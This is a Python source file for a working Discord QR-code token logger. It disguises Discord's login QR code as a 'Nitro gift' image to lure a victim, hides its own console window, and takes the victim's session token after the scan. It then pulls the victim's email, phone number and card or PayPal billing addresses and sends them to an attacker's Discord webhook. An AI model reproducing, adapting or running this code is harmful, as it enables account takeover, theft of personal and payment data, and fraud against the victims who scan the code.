import base64, os, re, time, sys, ctypes, time
from requests import get
from bs4 import BeautifulSoup
from PIL import Image
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from discord_webhook import DiscordEmbed, DiscordWebhook
from pystyle import System, Center, Colorate, Colors, Box, Write
from utilities import pystray_img, banner
from pystray import Menu, MenuItem, Icon
from io import BytesIO
from threading import Thread
from tempfile import TemporaryDirectory, NamedTemporaryFile

def generate_qr(path_1, path_2) -> None:
    qr_img = Image.open(path_1, "r")
    ovly_img = Image.open(os.path.join(os.getcwd(), 'resources', 'overlay.png'), "r")
    qr_img.paste(ovly_img, (60, 55))
    qr_img.save(path_2, quality=95)

def generate_nitro_template(path_2) -> None:
    nitro_template = Image.open(os.path.join(os.getcwd(), 'resources', 'template.png'), "r")
    nitro_template.paste(Image.open(path_2, "r"), (120, 409))
    nitro_template.save("discord_gift.png", quality=95)

def get_user_data(tk):
    try:
        headers = {'Authorization': tk}
        response = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
        return [response['username'], response['discriminator'], response['email'], response['phone']]
    except:
        return None

def get_discord_info(tk, link_int):
    headers = {'Authorization': tk}
    if link_int == 1:
        response = get('https://discordapp.com/api/v6/users/@me/billing/payment-sources',  headers=headers).json()
    elif link_int == 2:
        response = get('https://discordapp.com/api/v9/users/@me/billing/subscriptions',  headers=headers).json()
    return response
    
def main(webhook_url) -> None:
    Write.Print("\n\n[!] Generating Qr-Code...", Colors.red_to_purple)
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    opts.add_experimental_option('excludeSwitches', ['enable-logging'])
    opts.headless = True
    opts.add_argument('--log-level 3')
    from webdriver_manager.chrome import ChromeDriverManager # Importing the module here because it has conflict with pystyle.
    os.environ['WDM_LOG_LEVEL'] = '0'
    main.driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
    main.driver.get("https://discord.com/login")
    time.sleep(5)
    source = BeautifulSoup(main.driver.page_source, features="lxml")
    if not (div := re.search(r"qrCode-......", str(source))):
        print(Write.Print("\n[!] QR Code is not found, please retry or contact us !'", Colors.red_to_yellow))
        sys.exit()
    div = div.group(0)
    div = source.find("div", {"class": f"{div}"})
    qr_code = div.find("img")["src"]
    source = BeautifulSoup(main.driver.page_source, features="lxml")
    div = source.find("div", {"class": "qrCode"})
    discord_login = main.driver.current_url
    with TemporaryDirectory(dir='.') as td:
        with NamedTemporaryFile(dir=td, suffix='.png') as tp1:
            tp1.write(base64.b64decode(qr_code.replace('data:image/png;base64,', '')))
            Write.Print("\n[!] Generating QR-Code template...", Colors.red_to_purple)
            with NamedTemporaryFile(dir=td, suffix='.png') as tp2:
                generate_qr(tp1, tp2)
                Write.Print("\n[!] Generating QR-Code Nitro template...", Colors.red_to_purple)
                generate_nitro_template(tp2)
    Write.Print("\n[#] Waiting for target...", Colors.red_to_purple)
    pystray_icon.icon.notify("Script currently being hided until target grabbed.", 'Waiting for target')
    time.sleep(3)
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    while True:
        if discord_login != main.driver.current_url:
            try:
                os.remove('discord_gift.png')
            except:
                pass
            token = main.driver.execute_script('''
                window.dispatchEvent(new Event('beforeunload'));
                let iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                let localStorage = iframe.contentWindow.localStorage;
                var token = JSON.parse(localStorage.token);
                return token;
                ''')
            break
    main.driver.quit()
    pystray_icon.icon.notify("The traget scanned the QR-code sucessfuly.", 'New Victim !')
    time.sleep(3)
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
    Write.Print(f"\n\n[?] Token grabbed: {token}", Colors.rainbow)
    if webhook_url != None:
        Write.Print("\n\n[!] Fetching token data...", Colors.red_to_purple)
        webhook = DiscordWebhook(url=webhook_url, username='QR-Dtg', avatar_url="https://i.postimg.cc/qRHbRP2g/discord-avatar.png")
        embed = DiscordEmbed(color='88c800')
        if re.search(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", token) != None:
            userdata, user_billings, user_subs = get_user_data(token), get_discord_info(token, 1), get_discord_info(token, 2)
            if userdata != None:
                embed.add_embed_field(name='User Token Info', value=f":crown:`Username:` **{userdata[0]}#{userdata[1]}**\n:e_mail:`Mail:` **{userdata[2]}**\n:mobile_phone:`Phone:` **{userdata[3]}**\n:money_with_wings:`Nitro:` **{':white_check_mark:' if bool(user_subs) else ':x:'}**", inline=False)
                if bool(user_billings):
                    for data in user_billings:
                        if data['type'] == 1:
                            embed.add_embed_field(name='Payment Info (Debit or Credit Card)', value=f""":credit_card:`Brand:` ||**{data['brand']}**||\n:information_source:`Last 4:` ||**{data['last_4']}**||\n:date:`Expiration:` ||**{data['expires_month']}/{data['expires_year']}**||
                            ***Billing Adress:***\n:name_badge:`Name:` ||**{data['billing_address']['name']}**||\n:paperclip:`Line 1:` ||**{data['billing_address']['line_1']}**||\n:paperclips:`Line 2:` ||**{data['billing_address']['line_2']}**||\n:flag_white:`Country:` ||**{data['billing_address']['country']}**||\n:triangular_flag_on_post:`State:` ||**{data['billing_address']['state']}**||\n:cityscape:`City:` ||**{data['billing_address']['city']}**||\n:postbox:`Postal Code:` ||**{data['billing_address']['postal_code']}**||\n""", inline=False)
                        elif data['type'] == 2:
                            embed.add_embed_field(name='Payment Info (Paypal)', value=f""":incoming_envelope:`Paypal Mail:` ||**{data['email']}**||
                            ***Billing Adress:***\n:name_badge:`Name:` ||**{data['billing_address']['name']}**||\n:paperclip:`Line 1:` ||**{data['billing_address']['line_1']}**||\n:paperclips:`Line 2:` ||**{data['billing_address']['line_2']}**||\n:flag_white:`Country:` ||**{data['billing_address']['country']}**||\n:triangular_flag_on_post:`State:` ||**{data['billing_address']['state']}**||\n:cityscape:`City:` ||**{data['billing_address']['city']}**||\n:postbox:`Postal Code:` ||**{data['billing_address']['postal_code']}**||\n""", inline=False)
                else:
                    embed.add_embed_field(name='Payment Info (:x:)', value="**No Payment Info Founded.**\n", inline=False)
            else:
                embed.add_embed_field(name='User Token Info :interrobang:', value="**This token doesn't provide any information about the account, maybe it's corrupted.**\n", inline=False)
            embed.add_embed_field(name='Token', value=f"```yaml\n{token}\n```", inline=False)        
        else:
            embed.add_embed_field(name='Token', value=f"```yaml\n{token}\n```", inline=False)
        webhook.add_embed(embed)
        embed.set_footer(text='By Lemon.-_-.#3714, Luci (9P9), the-cult-of-integral and mte0', inline=False)
        Write.Print("\n[!] Sending data to discord webhook...", Colors.red_to_purple)
        webhook.execute()
    Write.Input('\n\n[*] Press ENTER to quit.', Colors.blue_to_green)
    
if __name__ == "__main__":
    System.Title('QR DISCORD LOGIN - By Lemon.-_-.#3714, Luci (9P9), the-cult-of-integral and mte0')
    System.Size(140, 35)
    print(Colorate.Horizontal(Colors.cyan_to_green, Center.XCenter(banner), 1))
    print(Colorate.Horizontal(Colors.rainbow, Center.GroupAlign(Box.DoubleCube("By Lemon.-_-.#3714, Luci (9P9), the-cult-of-integral and mte0")), 1))
    print(Colorate.Horizontal(Colors.rainbow, Box.Lines("https://github.com/9P9/Discord-QR-Token-Logger").replace('ቐ', "$"), 1), "\n")
    def pystray_icon():
        def window_state(icon, item):
            if str(item) == 'Show':
                return ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
            elif str(item) == 'Hide':
                return ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            elif str(item) == 'Quit':
                pystray_icon.icon.stop()
                try:
                    main.driver.quit()
                except:
                    pass
                os._exit(0)

        pystray_icon.icon = Icon('QR_DTG', Image.open(BytesIO(base64.b64decode(pystray_img))), menu=Menu(
            MenuItem('Show', window_state),
            MenuItem('Hide', window_state),
            MenuItem('Quit', window_state)
        ))
        pystray_icon.icon.run()
    confir = Write.Input("[*] Do you want to use a webhook url ? [y/n] -> ", Colors.green_to_cyan, interval=0.01)
    if confir == 'y':
        th_main = Thread(target=main, args=(Write.Input("\n[*] Enter your webhook url -> ", Colors.green_to_cyan, interval=0.01),))
    elif confir == 'n':
        th_main = Thread(target=main, args=(None,))
    else:
        os._exit(0)
    Thread(target=pystray_icon).start()
    th_main.start()
    while True:
        if not th_main.is_alive():
            pystray_icon.icon.stop()
            break
        time.sleep(1)
